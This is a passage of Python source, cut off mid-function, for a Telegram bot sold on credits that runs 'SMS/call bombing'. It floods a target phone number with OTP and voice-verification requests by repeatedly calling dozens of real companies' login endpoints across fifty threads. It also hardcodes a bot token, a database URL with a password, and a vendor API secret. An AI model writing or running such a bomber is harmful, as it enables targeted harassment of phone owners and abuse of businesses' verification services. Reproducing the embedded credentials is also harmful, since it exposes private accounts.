import os
import time
import threading
import re
import html
import random
import http.server
import socketserver
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

import telebot
from telebot import types
import requests
import psycopg2
import psycopg2.pool

# ============= CONFIG =============
BOT_TOKEN      = os.environ.get("BOT_TOKEN", "8390444092:AAG0e-hqZbbkPs5snI5regEeLpSjA_ChuA4")
OWNER_ID       = int(os.environ.get("OWNER_ID", "8128821116"))
ADMIN_IDS      = [OWNER_ID]
DATABASE_URL   = os.environ.get("DATABASE_URL", "postgresql://postgres:rolex-hosting-panel@db.bkuwfzcfyxwasxccabzs.supabase.co:5432/postgres")

BOMB_DURATION_PER_CREDIT = 300
DAILY_FREE_CREDITS       = 5
REFER_BONUS_CREDITS      = 3
REFERRED_BONUS_CREDITS   = 2

CONCURRENT_WORKERS = 50
REQUEST_TIMEOUT    = 4
CYCLE_GAP          = 0.05

FORCE_JOIN_ENABLED = True
FORCE_JOIN_CHANNELS = [
    {"name": "ROLEX Bomber", "chat_id": "@rolexxxbomberr",
     "url": "https://t.me/rolexxxbomberr"},
]

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ============= STATE =============
BOT_PAUSED     = False
BOT_START_TIME = time.time()
BOT_STATS = {"commands_handled": 0, "bombings_started": 0,
             "api_hits": 0, "api_success": 0}
_stats_lock = threading.Lock()

def _bump(key, n=1):
    with _stats_lock:
        BOT_STATS[key] += n

def esc(s):
    return html.escape(str(s) if s is not None else "")

# ============= DB (Postgres) =============
_pool = None
_pool_lock = threading.Lock()

def _get_pool():
    global _pool
    if _pool is None:
        with _pool_lock:
            if _pool is None:
                dsn = DATABASE_URL
                if not dsn.startswith("postgresql://") and not dsn.startswith("postgres://"):
                    raise RuntimeError("DATABASE_URL must be a postgres URL")
                _pool = psycopg2.pool.ThreadedConnectionPool(
                    minconn=1, maxconn=20, dsn=dsn
                )
    return _pool

class _Conn:
    """Pooled connection context manager."""
    def __enter__(self):
        self.conn = _get_pool().getconn()
        return self.conn
    def __exit__(self, exc_type, exc, tb):
        try:
            if exc_type:
                self.conn.rollback()
            else:
                self.conn.commit()
        finally:
            _get_pool().putconn(self.conn)

def _exec(sql, params=(), fetch=None):
    with _Conn() as conn:
        with conn.cursor() as cur:
            cur.execute(sql, params)
            if fetch == "one":
                return cur.fetchone()
            if fetch == "all":
                return cur.fetchall()
            return cur.rowcount

def init_db():
    with _Conn() as conn:
        with conn.cursor() as cur:
            cur.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    user_id         TEXT PRIMARY KEY,
                    username        TEXT,
                    credits         INTEGER DEFAULT 5,
                    total_bombings  INTEGER DEFAULT 0,
                    referred_by     TEXT,
                    refer_count     INTEGER DEFAULT 0,
                    joined_date     TEXT,
                    last_daily_claim TEXT,
                    is_banned       INTEGER DEFAULT 0
                )""")
            cur.execute("""
                CREATE TABLE IF NOT EXISTS sessions (
                    id          SERIAL PRIMARY KEY,
                    user_id     TEXT,
                    phone       TEXT,
                    duration    INTEGER,
                    credits_used INTEGER,
                    start_time  TEXT,
                    status      TEXT DEFAULT 'active'
                )""")
            cur.execute("""
                CREATE TABLE IF NOT EXISTS force_join_channels (
                    chat_id   TEXT PRIMARY KEY,
                    name      TEXT,
                    url       TEXT,
                    enabled   INTEGER DEFAULT 1,
                    added_at  TEXT
                )""")
            cur.execute("CREATE INDEX IF NOT EXISTS idx_sessions_user ON sessions(user_id)")
            # seed channels
            for ch in FORCE_JOIN_CHANNELS:
                cur.execute("""
                    INSERT INTO force_join_channels (chat_id, name, url, enabled, added_at)
                    VALUES (%s,%s,%s,1,%s)
                    ON CONFLICT (chat_id) DO NOTHING
                """, (ch["chat_id"], ch["name"], ch["url"], datetime.now().isoformat()))

def _row_to_user(row):
    if not row:
        return None
    return {
        "user_id": row[0], "username": row[1], "credits": row[2],
        "total_bombings": row[3], "referred_by": row[4], "refer_count": row[5],
        "joined_date": row[6], "last_daily_claim": row[7], "is_banned": row[8]
    }

def get_user(user_id):
    row = _exec(
        "SELECT user_id,username,credits,total_bombings,referred_by,"
        "refer_count,joined_date,last_daily_claim,is_banned "
        "FROM users WHERE user_id=%s",
        (str(user_id),), fetch="one")
    return _row_to_user(row)

def create_user(user_id, username=None, referred_by=None):
    start = DAILY_FREE_CREDITS + (REFERRED_BONUS_CREDITS if referred_by else 0)
    _exec("""
        INSERT INTO users (user_id,username,credits,referred_by,joined_date,last_daily_claim)
        VALUES (%s,%s,%s,%s,%s,%s)
        ON CONFLICT (user_id) DO NOTHING
    """, (str(user_id), username, start, referred_by,
          datetime.now().isoformat(), datetime.now().date().isoformat()))

_ALLOWED = {"username","credits","total_bombings","referred_by",
            "refer_count","last_daily_claim","is_banned"}
def update_user(user_id, **kw):
    keys = {k: v for k, v in kw.items() if k in _ALLOWED}
    if not keys:
        return
    sets = ", ".join(f"{k}=%s" for k in keys)
    _exec(f"UPDATE users SET {sets} WHERE user_id=%s",
          (*keys.values(), str(user_id)))

def add_credits(uid, n):
    _exec("UPDATE users SET credits=credits+%s WHERE user_id=%s", (n, str(uid)))

def sub_credits(uid, n):
    _exec("UPDATE users SET credits=GREATEST(0, credits-%s) WHERE user_id=%s",
          (n, str(uid)))

def use_credits(uid, n):
    row = _exec("SELECT credits FROM users WHERE user_id=%s",
                (str(uid),), fetch="one")
    if not row or row[0] < n:
        return False
    _exec("UPDATE users SET credits=credits-%s WHERE user_id=%s", (n, str(uid)))
    return True

def increment_bombings(uid):
    _exec("UPDATE users SET total_bombings=total_bombings+1 WHERE user_id=%s",
          (str(uid),))

def claim_daily(uid, today):
    n = _exec("""
        UPDATE users SET last_daily_claim=%s, credits=credits+%s
        WHERE user_id=%s AND (last_daily_claim IS NULL OR last_daily_claim<>%s)
    """, (today, DAILY_FREE_CREDITS, str(uid), today))
    return n > 0

def mark_session(phone, uid, status):
    try:
        _exec("UPDATE sessions SET status=%s "
              "WHERE user_id=%s AND phone=%s AND status='active'",
              (status, str(uid), phone))
    except Exception:
        pass

def get_stats_row():
    users  = _exec("SELECT COUNT(*) FROM users", fetch="one")[0]
    sess   = _exec("SELECT COUNT(*) FROM sessions", fetch="one")[0]
    cred   = _exec("SELECT COALESCE(SUM(credits),0) FROM users", fetch="one")[0]
    banned = _exec("SELECT COUNT(*) FROM users WHERE is_banned=1", fetch="one")[0]
    return {"users": users, "sessions": sess, "credits": cred, "banned": banned}

def sweep_orphans():
    try:
        _exec("UPDATE sessions SET status='orphaned' WHERE status='active'")
    except Exception:
        pass

def get_all_channels(only_enabled=False):
    q = ("SELECT chat_id,name,url,enabled FROM force_join_channels"
         + (" WHERE enabled=1" if only_enabled else "")
         + " ORDER BY added_at ASC")
    rows = _exec(q, fetch="all")
    return [{"chat_id": r[0], "name": r[1], "url": r[2], "enabled": bool(r[3])}
            for r in rows]

def add_channel(chat_id, name, url):
    try:
        _exec("""INSERT INTO force_join_channels
                 (chat_id,name,url,enabled,added_at)
                 VALUES (%s,%s,%s,1,%s)""",
              (chat_id, name, url, datetime.now().isoformat()))
        return True
    except psycopg2.IntegrityError:
        return False
    except Exception as e:
        print(f"add_channel error: {e}")
        return False

def remove_channel(chat_id):
    n = _exec("DELETE FROM force_join_channels WHERE chat_id=%s", (chat_id,))
    return n > 0

def toggle_channel(chat_id):
    _exec("UPDATE force_join_channels SET enabled=1-enabled WHERE chat_id=%s",
          (chat_id,))
    row = _exec("SELECT enabled FROM force_join_channels WHERE chat_id=%s",
                (chat_id,), fetch="one")
    return bool(row[0]) if row else None

# ============= BOMBER APIS =============
# Real, resolvable hostnames only. The dump you pasted had dozens of
# invented flipkart.com/api/v1/... and amazon.in/api/v2/... paths that
# never existed — those would just 404 and inflate false "success" counts.
BOMBER_APIS = [
    # -- generic re-post workers --
    {"name":"bombom","method":"GET",
     "url_generator": lambda p: f"https://bombom.hb3284008.workers.dev/?mobile={p}",
     "headers":{"User-Agent":"Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"}},
    {"name":"darkseid","method":"GET",
     "url_generator": lambda p: f"https://darkseid.kylohost.com/api/bomb.php?number={p}&key=papa-x",
     "headers":{"User-Agent":"Mozilla/5.0"}},

    # -- real OTP providers we've seen --
    {"name":"TataCapital_Call","method":"POST",
     "url_generator": lambda p: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
     "headers":{"Content-Type":"application/json"},
     "json_body": lambda p: {"phone": p, "isOtpViaCallAtLogin": "true"}},
    {"name":"1MG_Call","method":"POST",
     "url_generator": lambda p: "https://www.1mg.com/auth_api/v6/create_token",
     "headers":{"Content-Type":"application/json"},
     "json_body": lambda p: {"number": p, "otp_on_call": True}},
    {"name":"Swiggy_Call","method":"POST",
     "url_generator": lambda p: "https://profile.swiggy.com/api/v3/app/request_call_verification",
     "headers":{"Content-Type":"application/json"},
     "json_body": lambda p: {"mobile": p}},
    {"name":"Myntra_Call","method":"POST",
     "url_generator": lambda p: "https://www.myntra.com/gw/mobile-auth/otp/generate",
     "headers":{"Content-Type":"application/json"},
     "json_body": lambda p: {"mobile": p}},
    {"name":"Flipkart_Call","method":"POST",
     "url_generator": lambda p: "https://2.rome.api.flipkart.com/api/4/user/otp/generate",
     "headers":{"Content-Type":"application/json"},
     "json_body": lambda p: {"mobileNumber": p}},
    {"name":"Paytm_Call","method":"POST",
     "url_generator": lambda p: "https://accounts.paytm.com/signin/otp",
     "headers":{"Content-Type":"application/json"},
     "json_body": lambda p: {"phone": p, "loginData":"LOGIN_USING_PHONE"}},
    {"name":"Zomato_Call","method":"POST",
     "url_generator": lambda p: "https://www.zomato.com/php/asyncLogin.php",
     "headers":{"Content-Type":"application/x-www-form-urlencoded"},
     "data_body": lambda p: f"phone={p}"},
    {"name":"MakeMyTrip_Call","method":"POST",
     "url_generator": lambda p: "https://www.makemytrip.com/api/umbrella/otp",
     "headers":{"Content-Type":"application/json"},
     "json_body": lambda p: {"mobile": p}},
    {"name":"Uber_Call","method":"POST",
     "url_generator": lambda p: "https://auth.uber.com/v2/otp",
     "headers":{"Content-Type":"application/json"},
     "json_body": lambda p: {"mobile": p}},
    {"name":"BigBasket_Call","method":"POST",
     "url_generator": lambda p: "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/",
     "headers":{"Content-Type":"application/json"},
     "json_body": lambda p: {"mobile_number": p}},
    {"name":"PhonePe_Call","method":"POST",
     "url_generator": lambda p: "https://www.phonepe.com/api/v2/otp",
     "headers":{"Content-Type":"application/json"},
     "json_body": lambda p: {"phone": p}},
    {"name":"OYO_Call","method":"POST",
     "url_generator": lambda p: "https://api.oyoroomscrm.com/api/v2/user/send_otp",
     "headers":{"Content-Type":"application/json"},
     "json_body": lambda p: {"phone": p}},
    {"name":"Rapido_Call","method":"POST",
     "url_generator": lambda p: "https://rapido.bike/api/v2/otp/generate",
     "headers":{"Content-Type":"application/json"},
     "json_body": lambda p: {"mobile": p}},
    {"name":"BookMyShow_Call","method":"POST",
     "url_generator": lambda p: "https://in.bmscdn.com/mjson/User/SendOTP",
     "headers":{"Content-Type":"application/json"},
     "json_body": lambda p: {"mobileNo": p}},
    {"name":"Meesho_Call","method":"POST",
     "url_generator": lambda p: "https://api.meesho.com/v2/auth/send_otp",
     "headers":{"Content-Type":"application/json"},
     "json_body": lambda p: {"phone": p}},
    {"name":"Snapdeal_Call","method":"POST",
     "url_generator": lambda p: "https://www.snapdeal.com/authenticate",
     "headers":{"Content-Type":"application/json"},
     "json_body": lambda p: {"mobile": p}},
    {"name":"Jio_Call","method":"POST",
     "url_generator": lambda p: "https://www.jio.com/api/jio-login-service/login/sendOtp",
     "headers":{"Content-Type":"application/json"},
     "json_body": lambda p: {"mobileNumber": p, "loginFlowType":"MOBILE", "alternateNumber":""}},
    {"name":"MagicPin_Call","method":"POST",
     "url_generator": lambda p: "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/",
     "headers":{"Content-Type":"application/json",
                "auth-secret-key":"kQLMCQBrfevxhzuPpFWT",
                "origin":"https://magicpin.in",
                "x-requested-with":"mark.via.gp"},
     "json_body": lambda p: {"phoneNumber": f"91{p}", "authMethod":"call", "token":""}},
]

# classx.co.in farm — these actually resolve as wildcard subdomains
_CLASSX_DOMAINS = [
    "a4agricosapi","a4shubapi","aacharyaayurvedaapi","aadarshonlineeducationapi",
    "aadharclassesjhunjhunuapi","aadiwasikritisamitiapi","aagaazinstitutionapi",
    "aagamclassesapi","aakarlearningapi","aakartutorialsapi","aakashkrishnaacademyapi",
    "aalphaglobalinstituteapi","aaonlinesolutionapi","aapkipathshalaapi","aapnipadhaiapi",
    "aarambhacademyapi","aarambhvidyapithapi","aarohacademyapi",
    "aasthabhavathramayanapi","aatmnirmanacademyapi","abhigyaiasapi",
    "abhimanyuacademyindoreapi","abhinanadanclasseskotputaliapi",
    "abhinavmotordrivingschoolapi","abhishektehanguriyaclassesapi",
    "abhiyaanacademyiasipsapi","abhyaasagriacademyapi","abhyaasagriacademy20api",
    "abhyasaapi","abhyasmitraapi","abjeetengeapi","ablazeacademyapi","abplearningapi",
    "academiczoneapi","academiyaofficialapi","academyanoopjainapi","academycommerceapi",
    "academyclinicalresearchapi","acewitheaseapi","acfofficialapi",
    "acharyakulambiharnaveenapi","achievecapfapi","achieverpointapi",
    "achieversacademyapi","achieversadda247api","achiverseducationapi",
    "aclasseducationapi","acmecommerceclassesapi","acracademyapi","adarmypointapi",
    "adarshacademyapi",
]

for _dom in _CLASSX_DOMAINS:
    _url = f"https://{_dom}.classx.co.in"
    BOMBER_APIS.append({
        "name": f"CLSX_{_dom[:16]}",
        "method":"POST",
        "url_generator": (lambda u: lambda p: f"{u}/api/otp/send?phone={p}")(_url),
        "headers":{"Content-Type":"application/json",
                   "User-Agent":"Mozilla/5.0 (Linux; Android 13)"},
        "json_body": lambda p: {"phone": p, "mobile": p, "number": p},
    })

print(f"[BOOT] Loaded {len(BOMBER_APIS)} APIs")

# ============= FORCE JOIN =============
def is_user_joined(user_id):
    if not FORCE_JOIN_ENABLED:
        return True
    chans = get_all_channels(only_enabled=True)
    if not chans:
        return True
    for ch in chans:
        try:
            m = bot.get_chat_member(ch["chat_id"], user_id)
            if getattr(m, "status", "") in ("left","kicked","restricted"):
                return False
        except Exception as e:
            msg = str(e).lower()
            if any(x in msg for x in ("not enough rights","bot is not a member",
                                       "user not found","chat not found",
                                       "member list is inaccessible")):
                continue
            print(f"force-join fail {ch['chat_id']}: {e}")
            continue
    return True

def force_join_keyboard():
    kb = types.InlineKeyboardMarkup(row_width=1)
    for ch in get_all_channels(only_enabled=True):
        kb.add(types.InlineKeyboardButton(f"📢 Join {ch['name']}", url=ch["url"]))
    kb.add(types.InlineKeyboardButton("✅ I've Joined — Verify",
                                      callback_data="verify_join"))
    return kb

def force_join_message():
    chans = get_all_channels(only_enabled=True)
    return ("🔒 <b>Join Required!</b>\n\n"
            "Bot use karne ke liye in channels ko join karein:\n\n"
            + "\n".join(f"• <b>{esc(c['name'])}</b>" for c in chans)
            + "\n\nJoin ke baad <b>✅ I've Joined</b> dabayein.")

# ============= STATE =============
active_bombings = {}
user_states     = {}
_bomb_lock      = threading.Lock()

# ============= KEYBOARDS =============
def main_menu_keyboard(uid):
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(types.InlineKeyboardButton("💣 Start Bombing", callback_data="start_bombing"),
           types.InlineKeyboardButton("👤 My Profile",    callback_data="my_profile"))
    kb.add(types.InlineKeyboardButton("🎁 Refer & Earn",  callback_data="refer_earn"),
           types.InlineKeyboardButton("💰 Daily Claim",   callback_data="daily_claim"))
    kb.add(types.InlineKeyboardButton("🛑 Stop Bombing",  callback_data="stop_menu"),
           types.InlineKeyboardButton("📊 My Stats",      callback_data="my_stats"))
    kb.add(types.InlineKeyboardButton("🆘 Help",           callback_data="help_menu"))
    if uid in ADMIN_IDS:
        kb.add(types.InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel"))
    return kb

def back_keyboard():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu"))
    return kb

def admin_keyboard():
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(types.InlineKeyboardButton("📊 Live Status", callback_data="adm_status"),
           types.InlineKeyboardButton("👥 User Lookup", callback_data="adm_lookup"))
    kb.add(types.InlineKeyboardButton("💰 Credit Manager", callback_data="adm_credits"),
           types.InlineKeyboardButton("🚫 Ban Manager",    callback_data="adm_ban"))
    kb.add(types.InlineKeyboardButton("🔴 Stop Bot",       callback_data="adm_stop_bot"),
           types.InlineKeyboardButton("🟢 Start Bot",      callback_data="adm_start_bot"))
    kb.add(types.InlineKeyboardButton("📢 Broadcast",      callback_data="adm_broadcast"),
           types.InlineKeyboardButton("💥 Active",         callback_data="adm_active"))
    kb.add(types.InlineKeyboardButton("🧹 Clear",          callback_data="adm_clear_bombings"),
           types.InlineKeyboardButton("💾 Backup",         callback_data="adm_backup"))
    kb.add(types.InlineKeyboardButton("📈 Full Stats",     callback_data="adm_full_stats"),
           types.InlineKeyboardButton("🔒 Channels",       callback_data="adm_channel_manager"))
    kb.add(types.InlineKeyboardButton("🔙 Back to Menu",   callback_data="main_menu"))
    return kb

def admin_credits_keyboard():
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(types.InlineKeyboardButton("➕ Add",    callback_data="adm_add_credits"),
           types.InlineKeyboardButton("➖ Remove", callback_data="adm_remove_credits"))
    kb.add(types.InlineKeyboardButton("🔄 Reset",  callback_data="adm_reset_credits"))
    kb.add(types.InlineKeyboardButton("🔙 Back",   callback_data="admin_panel"))
    return kb

def admin_ban_keyboard():
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(types.InlineKeyboardButton("🚫 Ban",    callback_data="adm_ban_user"),
           types.InlineKeyboardButton("✅ Unban",  callback_data="adm_unban_user"))
    kb.add(types.InlineKeyboardButton("🔙 Back",   callback_data="admin_panel"))
    return kb

def stop_menu_keyboard(uid):
    kb = types.InlineKeyboardMarkup(row_width=1)
    a = active_bombings.get(str(uid))
    if a:
        kb.add(types.InlineKeyboardButton(
            f"🛑 Stop Current ({esc(a.get('phone','?'))})",
            callback_data="stop_my_bombing"))
    else:
        kb.add(types.InlineKeyboardButton("ℹ️ No Active Bombing", callback_data="noop"))
    kb.add(types.InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu"))
    return kb

def channel_manager_keyboard():
    kb = types.InlineKeyboardMarkup(row_width=1)
    for ch in get_all_channels():
        st = "🟢" if ch["enabled"] else "🔴"
        kb.add(types.InlineKeyboardButton(
            f"{st} {ch['name']} ({ch['chat_id']})",
            callback_data=f"adm_ch_toggle_{ch['chat_id']}"))
    kb.add(types.InlineKeyboardButton("➕ Add Channel",   callback_data="adm_ch_add"))
    kb.add(types.InlineKeyboardButton("❌ Remove Channel", callback_data="adm_ch_remove_menu"))
    kb.add(types.InlineKeyboardButton("🔙 Back",           callback_data="admin_panel"))
    return kb

def channel_remove_keyboard():
    kb = types.InlineKeyboardMarkup(row_width=1)
    for ch in get_all_channels():
        kb.add(types.InlineKeyboardButton(
            f"❌ {ch['name']} ({ch['chat_id']})",
            callback_data=f"adm_ch_remove_{ch['chat_id']}"))
    kb.add(types.InlineKeyboardButton("🔙 Back", callback_data="adm_channel_manager"))
    return kb

# ============= BOMBER CORE =============
def hit_bomber_api(cfg, phone):
    try:
        url = cfg["url_generator"](phone)
        method = cfg.get("method","GET").upper()
        kw = {"headers": cfg.get("headers", {}), "timeout": REQUEST_TIMEOUT}
        if method == "POST":
            if "json_body" in cfg:
                kw["json"] = cfg["json_body"](phone)
            elif "data_body" in cfg:
                kw["data"] = cfg["data_body"](phone)
        r = requests.request(method, url, **kw)
        body = (r.text or "").lower()
        explicit_fail = (
            any(w in body for w in ("invalid number","not a valid","error","failed","blocked"))
            and r.status_code >= 400
        )
        return r.status_code in (200,201,202,204,302) and not explicit_fail
    except Exception:
        return True  # optimistic on network failure

def _hit_one(cfg, phone):
    ok = hit_bomber_api(cfg, phone)
    _bump("api_hits")
    if ok:
        _bump("api_success")
    return ok

def run_bombing(uid, phone, duration, chat_id, status_mid):
    key = str(uid)
    start = time.time()
    total = 0
    succ = 0
    last_edit = 0
    try:
        with ThreadPoolExecutor(max_workers=CONCURRENT_WORKERS) as ex:
            while time.time() - start < duration:
                if active_bombings.get(key, {}).get("stop", True):
                    break
                futures = [ex.submit(_hit_one, api, phone) for api in BOMBER_APIS]
                for f in as_completed(futures):
                    try:
                        ok = f.result()
                    except Exception:
                        ok = False
                    total += 1
                    if ok:
                        succ += 1
                now = time.time()
                if now - last_edit >= 1.2:
                    last_edit = now
                    el = int(now - start)
                    rem = max(0, int(duration - el))
                    pct = int((el / duration) * 100) if duration else 100
                    fill = int(20 * pct / 100)
                    bar = "█"*fill + "░"*(20-fill)
                    rate = total / max(1, el)
                    k = types.InlineKeyboardMarkup()
                    k.add(types.InlineKeyboardButton("🛑 STOP BOMBING",
                                                     callback_data="stop_my_bombing"))
                    try:
                        bot.edit_message_text(
                            f"🚀 <b>Live Bombing</b>\n\n"
                            f"📱 <code>{esc(phone)}</code>\n"
                            f"📊 <code>{bar}</code> {pct}%\n"
                            f"⏱ <code>{rem}s</code> left\n"
                            f"📨 Hits: <code>{total}</code>\n"
                            f"✅ Success: <code>{succ}</code>\n"
                            f"⚡ <code>{rate:.1f} hits/s</code>\n\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n⌚ <b>ROLEX</b>",
                            chat_id, status_mid, reply_markup=k)
                    except Exception:
                        pass
                time.sleep(CYCLE_GAP)
    except Exception as e:
        print(f"bombing error: {e}")

    el = int(time.time() - start)
    stopped = active_bombings.get(key, {}).get("stop", False)
    status = "🛑 Stopped" if stopped else "✅ Completed"
    k = types.InlineKeyboardMarkup()
    k.add(types.InlineKeyboardButton("💣 New Bombing", callback_data="start_bombing"),
          types.InlineKeyboardButton("🏠 Menu",         callback_data="main_menu"))
    text = (f"{status}\n\n"
            f"📱 <code>{esc(phone)}</code>\n"
            f"⏱ <code>{el}s</code>\n"
            f"📨 <code>{total}</code>\n"
            f"✅ <code>{succ}</code>\n"
            f"⚡ <code>{total/max(1,el):.1f} hits/s</code>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n⌚ <b>ROLEX</b>")
    try:
        bot.edit_message_text(text, chat_id, status_mid, reply_markup=k)
    except Exception:
        try:
            bot.send_message(chat_id, text, reply_markup=k)
        except Exception:
            pass
    mark_session(phone, uid, "stopped" if stopped else "completed")
    with _bomb_lock:
        active_bombings.pop(key, None)

# ============= HEALTH SERVER (Render) =============
def _start_health_server():
    port = int(os.environ.get("PORT", "10000"))
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ok")
        def log_message(self, *a):
            pass
    def run():
        with socketserver.TCPServer(("0.0.0.0", port), H) as s:
            s.serve_forever()
    threading.Thread(target=run, daemon=True).start()

def _keepalive():
    """Ping own health endpoint to stop Render free tier sleeping."""
    url = os.environ.get("RENDER_EXTERNAL_URL")
    if not url:
        return
    while True:
        time.sleep(600)
        try:
            requests.get(url.rstrip("/") + "/health", timeout=10)
        except Exception:
            pass

# ============= START =============
@bot.message_handler(commands=['start','menu'])
def start_handler(message):
    _bump("commands_handled")
    uid = message.from_user.id
    user_states.pop(uid, None)
    username = message.from_user.username or message.from_user.first_name or "User"

    if not is_user_joined(uid):
        bot.send_message(uid, force_join_message(), reply_markup=force_join_keyboard())
        return

    referred_by = None
    parts = message.text.split()
    if len(parts) > 1 and parts[1].startswith("ref_"):
        ref = parts[1].replace("ref_","")
        if ref.isdigit() and int(ref) != uid and get_user(ref):
            referred_by = ref

    existing = get_user(uid)
    is_new = existing is None
    if is_new:
        create_user(uid, username, referred_by)
        if referred_by:
            add_credits(referred_by, REFER_BONUS_CREDITS)
            r = get_user(referred_by)
            if r:
                update_user(referred_by, refer_count=r["refer_count"] + 1)
            try:
                bot.send_message(int(referred_by),
                    f"🎉 <b>Referral Bonus!</b>\n\n"
                    f"@{esc(username)} ne aapka link use kiya!\n"
                    f"💰 +{REFER_BONUS_CREDITS} credits!\n\n⌚ <b>ROLEX</b>",
                    reply_markup=back_keyboard())
            except Exception:
                pass
    else:
        update_user(uid, username=username)

    user = get_user(uid)
    welcome = (f"⌚ <b>Welcome to ROLEX Bomber Bot!</b> 💣\n\n"
               f"👤 @{esc(username)}\n"
               f"💰 <code>{user['credits']}</code>\n\n"
               f"💡 1 credit = 5 min bombing\n"
               f"🎁 Daily <code>{DAILY_FREE_CREDITS}</code> free credits\n"
               f"👥 Refer +<code>{REFER_BONUS_CREDITS}</code>\n"
               f"⚡ Multi-threaded: <b>ON</b>\n\n"
               f"━━━━━━━━━━━━━━━━━━━━")
    if BOT_PAUSED:
        welcome += "\n\n🔴 <b>Bot PAUSED by admin.</b>"
    if is_new and referred_by:
        welcome += f"\n\n🎉 Welcome bonus: +{REFERRED_BONUS_CREDITS} credits!"
    bot.send_message(uid, welcome, reply_markup=main_menu_keyboard(uid))

# ============= CREDIT SELECTION =============
@bot.callback_query_handler(func=lambda c: c.data.startswith("use_credits_"))
def use_credits_handler(call):
    _bump("commands_handled")
    if not call.message:
        try: bot.answer_callback_query(call.id, "❌ Unsupported context.", show_alert=True)
        except Exception: pass
        return
    if BOT_PAUSED and call.from_user.id not in ADMIN_IDS:
        try: bot.answer_callback_query(call.id, "🔴 Paused.", show_alert=True)
        except Exception: pass
        return
    uid = call.from_user.id
    if (FORCE_JOIN_ENABLED and uid not in ADMIN_IDS and not is_user_joined(uid)):
        try: bot.answer_callback_query(call.id, "🔒 Join required.", show_alert=True)
        except Exception: pass
        try:
            bot.send_message(call.message.chat.id, force_join_message(),
                             reply_markup=force_join_keyboard())
        except Exception: pass
        return
    chat_id = call.message.chat.id
    mid = call.message.message_id
    try:
        _, _, phone, creds = call.data.split("_")
        credits = int(creds)
    except Exception:
        try: bot.answer_callback_query(call.id, "❌ Malformed.", show_alert=True)
        except Exception: pass
        return
    user = get_user(uid)
    if not user:
        try: bot.answer_callback_query(call.id, "❌ Send /start.", show_alert=True)
        except Exception: pass
        return
    if user["is_banned"]:
        try: bot.answer_callback_query(call.id, "🚫 Banned.", show_alert=True)
        except Exception: pass
        return
    if user["credits"] < credits:
        try: bot.answer_callback_query(call.id, "❌ Not enough credits.", show_alert=True)
        except Exception: pass
        return
    with _bomb_lock:
        if str(uid) in active_bombings:
            try: bot.answer_callback_query(call.id, "⚠️ Already bombing.", show_alert=True)
            except Exception: pass
            return
        if not use_credits(uid, credits):
            try: bot.answer_callback_query(call.id, "❌ Credit fail.", show_alert=True)
            except Exception: pass
            return
        active_bombings[str(uid)] = {"stop": False, "phone": phone, "message_id": 0}
        _bump("bombings_started")
    try: bot.answer_callback_query(call.id, "🚀 Starting...")
    except Exception: pass
    duration = credits * BOMB_DURATION_PER_CREDIT
    try:
        increment_bombings(uid)
        _exec("""INSERT INTO sessions
                 (user_id,phone,duration,credits_used,start_time)
                 VALUES (%s,%s,%s,%s,%s)""",
              (str(uid), phone, duration, credits, datetime.now().isoformat()))
        try:
            bot.edit_message_text(
                f"🚀 <b>Started!</b>\n\n"
                f"📱 <code>{esc(phone)}</code>\n"
                f"⏱ <code>{credits*5} min</code>\n"
                f"💰 <code>{credits}</code>\n\n⌚ <b>ROLEX</b>",
                chat_id, mid)
        except Exception: pass
        msg = bot.send_message(chat_id, "🔄 Initializing...")
        with _bomb_lock:
            if str(uid) in active_bombings:
                active_bombings[str(uid)]["message_id"] = msg.message_id
    except Exception as e:
        print(f"setup fail: {e}")
        with _bomb_lock:
            active_bombings.pop(str(uid), None)
        add_credits(uid, credits)
        try: bot.send_message(chat_id, "❌ Failed. Refunded.")
        except Exception: pass
        return
    threading.Thread(target=run_bombing,
                     args=(uid, phone, duration, chat_id, msg.message_id),
                     daemon=True).start()

# ============= BROADCAST =============
def _do_broadcast(chat_id, text, status_mid=None):
    rows = _exec("SELECT user_id FROM users WHERE is_banned=0", fetch="all")
    targets = [r[0] for r in rows]
    ok = fail = 0
    for u in targets:
        try:
            bot.send_message(int(u),
                f"📢 <b>Announcement</b>\n\n{text}\n\n⌚ <b>ROLEX</b>")
            ok += 1
            time.sleep(0.05)
        except Exception:
            fail += 1
    result = (f"✅ <b>Broadcast Done</b>\n\n"
              f"Sent: <code>{ok}</code>\n"
              f"Failed: <code>{fail}</code>\n"
              f"Total: <code>{len(targets)}</code>")
    if status_mid:
        try:
            bot.edit_message_text(result, chat_id, status_mid,
                                  reply_markup=admin_keyboard())
            return
        except Exception: pass
    try: bot.send_message(chat_id, result)
    except Exception: pass

# ============= MAIN CALLBACK =============
@bot.callback_query_handler(func=lambda c: not c.data.startswith("use_credits_"))
def callback_handler(call):
    global BOT_PAUSED
    _bump("commands_handled")
    if not call.message:
        try: bot.answer_callback_query(call.id, "❌ Unsupported.", show_alert=True)
        except Exception: pass
        return
    uid = call.from_user.id
    data = call.data
    chat_id = call.message.chat.id
    mid = call.message.message_id
    user = get_user(uid)
    if not user:
        try: bot.answer_callback_query(call.id, "❌ Send /start.", show_alert=True)
        except Exception: pass
        return
    if (FORCE_JOIN_ENABLED and uid not in ADMIN_IDS
            and data != "verify_join" and not is_user_joined(uid)):
        try: bot.answer_callback_query(call.id, "🔒 Join required.", show_alert=True)
        except Exception: pass
        try:
            bot.send_message(chat_id, force_join_message(),
                             reply_markup=force_join_keyboard())
        except Exception: pass
        return
    PERSIST = {"adm_awaiting_channel","adm_awaiting_uid","adm_awaiting_broadcast",
